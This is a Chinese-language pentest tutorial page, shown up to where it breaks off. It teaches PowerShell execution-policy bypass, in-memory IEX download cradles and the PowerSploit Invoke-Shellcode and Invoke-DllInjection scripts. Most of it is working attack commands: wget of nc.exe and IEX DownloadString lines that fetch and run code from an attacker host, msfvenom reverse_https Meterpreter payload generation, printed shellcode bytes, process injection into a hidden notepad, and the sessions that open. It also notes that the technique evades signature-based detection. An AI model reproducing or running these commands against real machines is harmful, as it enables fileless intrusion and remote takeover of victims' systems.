<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">PowerShell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-ExecutionPolicy</span> <span class="nb">Bypass-WindowStyle</span> <span class="nb">Hidden-NoProfile</span><span class="n">-Nonl</span> <span class="nb">IEX </span><span class="p">(</span><span class="nb">New-ObjectNet</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s2">&#34;xxx.ps1&#34;</span><span class="p">);[</span><span class="no">Parameters</span><span class="p">]</span>
</span></span></code></pre></div><ol start="4">
<li>powershell 下载远程数据</li>
</ol>
<p>Win 7 PowerShell WebClient：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadFile</span><span class="p">(</span><span class="s2">&#34;http://10.0.0.10/nc.exe&#34;</span><span class="p">,</span><span class="s2">&#34;nc.exe&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>Win 8及更高版本PowerShell Invoke-WebRequest (wget)：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="nb">wget </span><span class="s2">&#34;http://172.16.0.107:8000/nc.exe&#34;</span> <span class="n">-outfile</span> <span class="s2">&#34;nc.exe&#34;</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="p">(</span><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s2">&#34;http://127.0.0.1/hack.ps1&#34;</span> <span class="n">-OutFile</span> <span class="s2">&#34;C:\1.ps1&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>以上命令的参数说明：</p>
<ul>
<li>ExecutionPolicy Bypass : 绕过执行安全策略，这个参数非常重要，在默认情况下，PowerShell的安全策略规定了PowerShell不允许运行命令和文件。通过设置这个参数，可以绕过任意一个安全规则。在渗透测试中，基本每一次运行PowerShell脚本时都要使用这个参数。</li>
<li>WindowStyle Hidden ： 隐藏窗口</li>
<li>NoLogo : 启动不显示版权标志的PowerShell</li>
<li>NonInteractive (-Nonl) : 非交互模式，PowerShell不为用户提供交互的提示</li>
<li>NoProfile (-Nop): PowerShell控制台不加载当前用户的配置文件</li>
<li>Noexit : 执行后不退出Shell。这在使用键盘记录等脚本时非常重要。</li>
<li>Net.WebClient：这个是.Net的内容了，意思就是创建WebClient对象，然后利用WebClient对象里面的<code>DownloadString</code>方法进行下载，相关知识可以查阅<a href="https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0">net.webclient</a></li>
<li>IEX：这个对初学powershell的同学们可能有点陌生，其实这个就是<code>Invoke-Expression</code>的别名把上面的IEX换成Invoke-Expression效果是一样的，好比如shell中的alias，跟上面的<code>Net.WebClient</code>组合起来的功能就是下载字符串然后执行。<code>Invoke-Expression</code>相关的知识可以到微软官方学习<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2">Invoke-Expression</a></li>
</ul>
<p>PowerShell脚本在默认情况下无法直接运行，这时就可以使用上述三种方法绕过安全策略运行脚本。</p>
<p>我们来设置一下执行权限,设置成不能执行脚本的权限<code>restricted</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">set-executionpolicy</span> <span class="n">restricted</span>
</span></span><span class="line"><span class="cl"><span class="n">执行策略更改</span>
</span></span><span class="line"><span class="cl"><span class="n">执行策略可帮助你防止执行不信任的脚本</span><span class="err">。</span><span class="n">更改执行策略可能会产生安全风险</span><span class="err">，</span><span class="n">如</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">go</span><span class="p">.</span><span class="py">microsoft</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">fwlink</span><span class="p">/</span><span class="k">?</span><span class="n">LinkID</span><span class="p">=</span><span class="mf">135170</span>
</span></span><span class="line"><span class="cl"><span class="n">中的</span> <span class="n">about_Execution_Policies</span> <span class="n">帮助主题所述</span><span class="err">。</span><span class="n">是否要更改执行策略</span><span class="p">?</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">Y</span><span class="p">]</span> <span class="n">是</span><span class="p">(</span><span class="n">Y</span><span class="p">)</span>  <span class="p">[</span><span class="no">A</span><span class="p">]</span> <span class="n">全是</span><span class="p">(</span><span class="n">A</span><span class="p">)</span>  <span class="p">[</span><span class="no">N</span><span class="p">]</span> <span class="n">否</span><span class="p">(</span><span class="n">N</span><span class="p">)</span>  <span class="p">[</span><span class="no">L</span><span class="p">]</span> <span class="n">全否</span><span class="p">(</span><span class="n">L</span><span class="p">)</span>  <span class="p">[</span><span class="no">S</span><span class="p">]</span> <span class="n">暂停</span><span class="p">(</span><span class="n">S</span><span class="p">)</span>  <span class="p">[?]</span> <span class="n">帮助</span> <span class="p">(</span><span class="n">默认值为</span><span class="err">“</span><span class="n">N</span><span class="err">”</span><span class="p">)</span><span class="err">:</span> <span class="n">y</span>
</span></span></code></pre></div><p>然后使用我们的绕过执行的命令：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="n">PowerShell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="o">-File</span> <span class="p">.\</span><span class="n">Script</span><span class="p">.</span><span class="py">ps1</span>
</span></span><span class="line"><span class="cl"><span class="n">Hello</span><span class="p">,</span><span class="n">Powershell</span> <span class="n">Script</span>
</span></span></code></pre></div><h1 id="powersploit">PowerSploit</h1>
<p>PowerSploit是一款基于PowerShell的后渗透（Post-Exploition）框架软件，包含很多PowerShell攻击脚本，它们主要用于渗透中的信息侦查、权限提升、权限维持。其GitHub地址为：https://github.com/PowerShellMafia/PowerSploit</p>
<h2 id="安装">安装</h2>
<p>我们把整个文件从GitHub上下载下来：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/tools/windows<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ git clone https://github.com/PowerShellMafia/PowerSploit.git
</span></span></code></pre></div><p>当中有很多模块，如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/tools/windows/PowerSploit<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ tree -d -L <span class="m">1</span>
</span></span><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">├── AntivirusBypass  //发现杀毒软件的查杀特征
</span></span><span class="line"><span class="cl">├── CodeExecution    //在目标主机上执行代码
</span></span><span class="line"><span class="cl">├── docs             //文档
</span></span><span class="line"><span class="cl">├── Exfiltration    //目标主机上的信息搜集工具
</span></span><span class="line"><span class="cl">├── Mayhem          //蓝屏等破坏性脚本
</span></span><span class="line"><span class="cl">├── Persistence     //后门脚本（持久性控制）
</span></span><span class="line"><span class="cl">├── Privesc         //提权脚本
</span></span><span class="line"><span class="cl">├── Recon           //以目标主机为跳板进行内网信息侦查
</span></span><span class="line"><span class="cl">├── ScriptModification  //在目标主机上创建或修改脚本
</span></span><span class="line"><span class="cl">└── Tests
</span></span></code></pre></div><p>我们为了方便远程去利用，我们可以在攻击机（Kali）中开启一个Http服务器，可以使用python来建立一个简易的HTTP服务器,在我们的PowerSploit目录下执行：</p>
<ul>
<li>
<p>Python2</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python -m SimpleHTTPServer <span class="m">8000</span>
</span></span></code></pre></div></li>
<li>
<p>Python3</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python -m http.server
</span></span></code></pre></div></li>
</ul>
<p>然后我们访问http://172.16.0.107:8000/（因为我的kali攻击机IP是172.16.0.107，可以执行ifconfig进行查看IP）</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//1.png" alt=""></p>
<h2 id="攻击实战">攻击实战</h2>
<h3 id="invoke-shellcode">Invoke-Shellcode</h3>
<p>CodeExecution模块下的Invoke-Shellcode脚本常用于将Shellcode插入指定的进程ID或本地PowerShell中，下面介绍两种常用的反弹Meterpreter Shell方法。</p>
<ol>
<li><strong>直接执行shellcode反弹Meterpreter Shell</strong></li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kali@kali:~# sudo msfconsole
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf5 &gt; use exploit/multi/handler
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> payload windows/meterpreter/reverse_https
</span></span><span class="line"><span class="cl"><span class="nv">payload</span> <span class="o">=</span>&gt; windows/meterpreter/reverse_https
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> LHOST 172.16.0.107 
</span></span><span class="line"><span class="cl"><span class="nv">LHOST</span> <span class="o">=</span>&gt; 172.16.0.107
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">4444</span>
</span></span><span class="line"><span class="cl"><span class="nv">LPORT</span> <span class="o">=</span>&gt; <span class="m">4444</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; show options
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Module options <span class="o">(</span>exploit/multi/handler<span class="o">)</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name  Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----  ---------------  --------  -----------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Payload options <span class="o">(</span>windows/meterpreter/reverse_https<span class="o">)</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name      Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----      ---------------  --------  -----------
</span></span><span class="line"><span class="cl">   EXITFUNC  process          yes       Exit technique <span class="o">(</span>Accepted: <span class="s1">&#39;&#39;</span>, seh, thread, process, none<span class="o">)</span>
</span></span><span class="line"><span class="cl">   LHOST     172.16.0.107   yes       The <span class="nb">local</span> listener hostname
</span></span><span class="line"><span class="cl">   LPORT     <span class="m">4444</span>             yes       The <span class="nb">local</span> listener port
</span></span><span class="line"><span class="cl">   LURI                       no        The HTTP Path
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Exploit target:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Id  Name
</span></span><span class="line"><span class="cl">   --  ----
</span></span><span class="line"><span class="cl">   <span class="m">0</span>   Wildcard Target
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started HTTPS reverse handler on https://172.16.0.107:4444
</span></span></code></pre></div><p>使用msfvenom命令生成一个powershell脚本木马:</p>
<blockquote>
<p>注意这里的<code>x64</code>，如果在64位系统不加上这个的话会出现powershell停止工作:</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/tools/windows/PowerSploit<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ msfvenom -p windows/x64/meterpreter/reverse_https <span class="nv">LHOST</span><span class="o">=</span>172.16.0.107 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f powershell -o /home/kali/tools/windows/PowerSploit/test                                                                                          <span class="m">2</span> 
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::ModulE:<span class="se">\:</span>Platform::Windows from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload sizE:<span class="se">\ </span><span class="m">784</span> bytes
</span></span><span class="line"><span class="cl">Final size of powershell filE:<span class="se">\ </span><span class="m">3845</span> bytes
</span></span><span class="line"><span class="cl">Saved as: /home/kali/tools/windows/PowerSploit/test
</span></span></code></pre></div><p>接着在目标机Powershell下输入以下命令下载该脚本:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s2">&#34;http://172.16.0.107:8000/CodeExecution/Invoke-Shellcode.ps1&#34;</span><span class="p">)</span>
</span></span></code></pre></div><blockquote>
<p><code>DownloadString()</code>并不会将文件下载到磁盘中，相反，该方法会将远程文件的内容直接载入受害者主机的内存中。这些文件通常为恶意脚本，攻击者可以使用Powershell的<code>–Command</code>参数在内存中直接执行这些文件。无文件恶意软件中经常用到这种技术，以便在内存中直接执行恶意脚本，而无需将任何文件保存到磁盘中。攻击者经常使用这种技术来绕过基于特征的检测机制。</p>
</blockquote>
<p>接着输入以下命令下载木马:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s2">&#34;http://172.16.0.107:8000/test&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>接着在powershell下运行如下命令:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">Invoke-Shellcode</span> <span class="n">-Shellcode</span> <span class="p">(</span><span class="nv">$buf</span><span class="p">)</span> <span class="n">-Force</span>
</span></span></code></pre></div><p>可以看到我们的msf已经上线了：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msf6 exploit(multi/handler) &gt; run
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] Started HTTPS reverse handler on https://172.16.0.107:4444
</span></span><span class="line"><span class="cl">[!] https://172.16.0.107:4444 handling request from 172.16.0.106; (UUID: j37aqvzr) Without a database connected that payload UUID tracking will not work!
</span></span><span class="line"><span class="cl">[*] https://172.16.0.107:4444 handling request from 172.16.0.106; (UUID: j37aqvzr) Staging x64 payload (201308 bytes) ...
</span></span><span class="line"><span class="cl">[!] https://172.16.0.107:4444 handling request from 172.16.0.106; (UUID: j37aqvzr) Without a database connected that payload UUID tracking will not work!
</span></span><span class="line"><span class="cl">[*] Meterpreter session 1 opened (172.16.0.107:4444 -&gt; 127.0.0.1 ) at 2022-01-17 17:02:57 +0800
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt; sysinfo
</span></span><span class="line"><span class="cl">Computer        : WIN-I1OIAEUTNT1
</span></span><span class="line"><span class="cl">OS              : Windows 2016+ (10.0 Build 14393).
</span></span><span class="line"><span class="cl">Architecture    : x64
</span></span><span class="line"><span class="cl">System Language : zh_CN
</span></span><span class="line"><span class="cl">Domain          : WORKGROUP
</span></span><span class="line"><span class="cl">Logged On Users : 1
</span></span><span class="line"><span class="cl">Meterpreter     : x64/windows
</span></span><span class="line"><span class="cl">meterpreter &gt; 
</span></span></code></pre></div><ul>
<li>
<p>这里的<code>-Force</code> 意思是不用提示，直接执行</p>
</li>
<li>
<p><code>$buf</code>是要执行的内容，可以在kali上面看test的内容</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/tools/windows/PowerSploit<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ cat <span class="nb">test</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>Byte<span class="o">[]]</span> <span class="nv">$buf</span> <span class="o">=</span> 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x48,0x31,0xd2,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">0x0,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
</span></span></code></pre></div><ol start="2">
<li><strong>指定进程注入shellcode反弹Meterpreter Shell</strong></li>
</ol>
<p>同样先在目标机Powershell下输入命令下载脚本和木马:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PS E:<span class="se">\&gt;</span> IEX <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s2">&#34;http://172.16.0.107:8000/CodeExecution/Invoke-Shellcode.ps1&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">PS E:<span class="se">\&gt;</span> IEX <span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s2">&#34;http://172.16.0.107:8000/test&#34;</span><span class="o">)</span>
</span></span></code></pre></div><p>接着输入Get-Process命令或者ps命令查看当前进程:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">get-process</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Handles</span>  <span class="n">NPM</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>    <span class="n">PM</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>      <span class="n">WS</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>     <span class="n">CPU</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>     <span class="n">Id</span>  <span class="nb">SI </span><span class="n">ProcessName</span>
</span></span><span class="line"><span class="cl"><span class="p">-------</span>  <span class="p">------</span>    <span class="p">-----</span>      <span class="p">-----</span>     <span class="p">------</span>     <span class="p">--</span>  <span class="p">--</span> <span class="p">-----------</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="mf">190</span>      <span class="mf">12</span>     <span class="mf">2840</span>      <span class="mf">10288</span>       <span class="mf">0.03</span>   <span class="mf">2696</span>   <span class="mf">0</span> <span class="n">msdtc</span>
</span></span><span class="line"><span class="cl">    <span class="mf">434</span>      <span class="mf">59</span>   <span class="mf">100276</span>      <span class="mf">82620</span>       <span class="mf">6.84</span>   <span class="mf">2004</span>   <span class="mf">0</span> <span class="n">MsMpEng</span>
</span></span><span class="line"><span class="cl">    <span class="mf">730</span>      <span class="mf">39</span>    <span class="mf">61676</span>      <span class="mf">75816</span>       <span class="mf">2.19</span>   <span class="mf">2016</span>   <span class="mf">1</span> <span class="n">powershell</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span></code></pre></div><p>然后输入以下命令创建一个新的进程，并把它设置为隐藏窗口执行，再查看notepad的进程id为3048：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">start-process</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">notepad</span><span class="p">.</span><span class="py">exe</span> <span class="n">-WindowStyle</span> <span class="n">Hidden</span>
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">get-process</span> <span class="n">notepad</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Handles</span>  <span class="n">NPM</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>    <span class="n">PM</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>      <span class="n">WS</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>     <span class="n">CPU</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>     <span class="n">Id</span>  <span class="nb">SI </span><span class="n">ProcessName</span>
</span></span><span class="line"><span class="cl"><span class="p">-------</span>  <span class="p">------</span>    <span class="p">-----</span>      <span class="p">-----</span>     <span class="p">------</span>     <span class="p">--</span>  <span class="p">--</span> <span class="p">-----------</span>
</span></span><span class="line"><span class="cl">    <span class="mf">164</span>      <span class="mf">11</span>     <span class="mf">2328</span>      <span class="mf">10920</span>       <span class="mf">0.03</span>   <span class="mf">3048</span>   <span class="mf">1</span> <span class="n">notepad</span>
</span></span></code></pre></div><p>接着输入以下命令，使用Invoke-Shellcode脚本进行进程注入：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">Invoke-Shellcode</span> <span class="n">-ProcessID</span> <span class="mf">3048</span> <span class="n">-Shellcode</span> <span class="p">(</span><span class="nv">$buf</span><span class="p">)</span> <span class="n">-Force</span>
</span></span></code></pre></div><blockquote>
<p>记得提前在msf设置监听模式</p>
</blockquote>
<p>可以看到msf已经反弹shell回来了：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msf6 exploit(multi/handler) &gt; run
</span></span><span class="line"><span class="cl">[*] Started HTTPS reverse handler on https://172.16.0.107:4444
</span></span><span class="line"><span class="cl">[!] https://172.16.0.107:4444 handling request from 172.16.0.106; (UUID: 4cj9oxgk) Without a database connected that payload UUID tracking will not work!
</span></span><span class="line"><span class="cl">[*] https://172.16.0.107:4444 handling request from 172.16.0.106; (UUID: 4cj9oxgk) Staging x64 payload (201308 bytes) ...
</span></span><span class="line"><span class="cl">[!] https://172.16.0.107:4444 handling request from 172.16.0.106; (UUID: 4cj9oxgk) Without a database connected that payload UUID tracking will not work!
</span></span><span class="line"><span class="cl">[*] Meterpreter session 2 opened (172.16.0.107:4444 -&gt; 127.0.0.1 ) at 2022-01-17 18:13:43 +0800
</span></span><span class="line"><span class="cl">meterpreter &gt; 
</span></span></code></pre></div><p>我们可以看到powershell的窗口和进程关闭后也不会影响我们的shell中断：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; ps
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Process List
</span></span><span class="line"><span class="cl">============
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> PID   PPID  Name                      Arch  Session  User                           Path
</span></span><span class="line"><span class="cl"> ---   ----  ----                      ----  -------  ----                           ----
</span></span><span class="line"><span class="cl"> 0     0     [System Process]
</span></span><span class="line"><span class="cl"> 4     0     System                    x64   0
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl"> 3048  2016  notepad.exe               x64   1        WIN-I1OIAEUTNT1\Administrator  C:\Windows\System32\notepad.exe
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></div><h3 id="invoke-dllinjection">Invoke-DllInjection</h3>
<p>下面使用CodeExecution模块下的另一个脚本Invoke-DllInjection，它是一个DLL注入的脚本。</p>
<p>同理还是首先在MSF里配置好监听，然后在目标机器上执行：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s2">&#34;http://172.16.0.107:8000/CodeExecution/Invoke-DllInjection.ps1&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>使用以下命令在kali中生成一个dll的反弹木马：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/tools/windows/PowerSploit<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ msfvenom -p windows/x64/meterpreter/reverse_https <span class="nv">LHOST</span><span class="o">=</span>172.16.0.107 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f dll -o /home/kali/tools/windows/PowerSploit/test.dll  
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::ModulE:<span class="se">\:</span>Platform::Windows from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload sizE:<span class="se">\ </span><span class="m">802</span> bytes
</span></span><span class="line"><span class="cl">Final size of dll filE:<span class="se">\ </span><span class="m">8704</span> bytes
</span></span><span class="line"><span class="cl">Saved as: /home/kali/tools/windows/PowerSploit/test.dll
</span></span></code></pre></div><p>将<code>test.dll</code>下载到目标机器上：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">wget </span><span class="s2">&#34;http://172.16.0.107:8000/test.dll&#34;</span> <span class="n">-outfile</span> <span class="s2">&#34;test.dll&#34;</span>
</span></span></code></pre></div><p>接着启动一个notepad的新进程：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">start-process</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">notepad</span><span class="p">.</span><span class="py">exe</span> <span class="n">-WindowStyle</span> <span class="n">Hidden</span>
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">E:</span><span class="p">\&gt;</span> <span class="nb">get-process</span> <span class="n">notepad</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Handles</span>  <span class="n">NPM</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>    <span class="n">PM</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>      <span class="n">WS</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>     <span class="n">CPU</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>     <span class="n">Id</span>  <span class="nb">SI </span><span class="n">ProcessName</span>
</span></span><span class="line"><span class="cl"><span class="p">-------</span>  <span class="p">------</span>    <span class="p">-----</span>      <span class="p">-----</span>     <span class="p">------</span>     <span class="p">--</span>  <span class="p">--</span> <span class="p">-----------</span>
</span></span><span class="line"><span class="cl">     <span class="mf">164</span>      <span class="mf">11</span>     <span class="mf">2496</span>      <span class="mf">11004</span>       <span class="mf">0.02</span>   <span class="mf">4828</span>   <span class="mf">1</span> <span class="n">notepad</span>
</span></span></code></pre></div><p>使用Invoke-Shellcode脚本进行进程注入：</p>
